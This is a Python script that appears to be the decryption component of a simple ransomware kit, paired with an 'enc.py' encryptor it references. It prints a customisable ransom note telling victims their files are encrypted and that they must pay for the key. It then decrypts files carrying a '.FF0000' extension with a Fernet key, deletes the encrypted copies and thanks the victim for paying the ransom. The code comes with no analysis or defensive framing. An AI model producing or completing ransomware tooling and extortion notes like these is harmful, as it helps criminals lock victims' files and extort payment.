#!/usr/bin/python3

import sys
import os
from cryptography.fernet import Fernet,InvalidToken

def usage():
    print("Ooops, your important files are encrypted!")
    print()
    print("If you see this text, then your files are no longer accessible,")
    print("because they have been encrypted. Perhaps you are busy looking")
    print("for a way to recover your files, but don't waste your time.")
    print("Nobody can recover your files without our decryption service.")
    print("We guarantee that you can recover all your files safely and")
    print("easily. All you need to do is submit the payment and purchase")
    print("the decryption key.")
    print()

    # Place whatever text here

    print("To decrypt, make sure all the encrypted files have the .FF0000 extension, in the same")
    print("directory as the dec.py tool, then invoke this decryption tool like so: python dec.py --key=YoURs0op3rs3cr3TKEyFile")
    print("Make sure you use the right key! BACK UP THE ENCRYPTED FILES BEFORE DOING ANYTHING!")
    print("tar -cvzf backup.tgz ./*.FF0000 && mv backup.tgz /tmp")
    sys.exit(1)

def files(path):
    retfiles = []
    for root, dirs, file_obj in os.walk(path):
        for f in file_obj:
            retfiles.append(os.path.join(root, f))
    return retfiles

def main(k):
    badfiles = ["enc.py", "key", os.path.basename(__file__)]
    try:
        key = k.encode()
        fernet = Fernet(key)
    except ValueError:
        print("Wrong key length?")
        sys.exit(1)
    # key needs to be a bytestring

    print("Decrypting...")
    filelist = files(".")
    for obj in filelist:
        if ".FF0000" not in obj:
            continue
        if obj in badfiles:
            continue
        with open(obj, 'rb') as f:
            data = f.read()
        try:
            decrypted = fernet.decrypt(data)
        except InvalidToken:
            print("WRONG KEY! DON'T GUESS!")
            sys.exit(1)
        filename = obj[:-7]
        with open(filename, 'wb') as f:
            f.write(decrypted)
        os.remove(obj)

    print("Your files should be decrypted now!")
    print("Thank you for paying your ransom!")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        usage()
    else:
        if "--key=" in sys.argv[1]:
            (junk, key) = sys.argv[1].split("=", 1)
            main(key)
        else:
            usage()

